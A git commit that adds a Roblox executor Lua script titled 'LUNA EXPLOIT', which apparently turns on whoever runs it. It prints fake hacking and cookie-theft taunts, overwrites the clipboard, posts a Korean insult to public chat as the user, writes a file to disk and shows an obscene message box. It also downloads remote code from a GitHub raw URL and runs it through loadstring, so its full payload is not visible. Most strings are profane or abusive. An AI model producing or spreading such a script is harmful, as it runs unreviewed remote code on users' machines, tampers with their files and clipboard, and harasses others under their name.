f6d87c967ea0fda498a774f7caed769eb6669740
PineAppleHollyday <92834087+PineAppleHollyday@users.noreply.github.com>
2022-07-03 11:48:11 +0900

    Add files via upload

---
+++ UntelScript.lua
@@ -0,0 +1,19 @@
+rconsolename('LUNA EXPLOIT')
+rconsoleprint('@@RED@@')
+rconsoleerr('HACKING YOUR ACCOUNT')
+rconsolewarn('your cookie so yammy~')
+rconsolewarn('mom help me~')
+
+setclipboard('fuxkin ScriptKiddy')
+
+
+local ohString1 = "저는 병a r k신입니다."
+local ohString2 = "All"
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+
+
+writefile("fuxkinPussy.py", "print('im a pussy')\nprint('sex')\ninput()")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PineAppleHollyday/IIIIII/main/123.txt?token=GHSAT0AAAAAABS4XG5LRQMVMNS5QQEO2D4WYTP2A5A"))();
+
+messagebox('your momboy~', "MotherFuxker", "0")
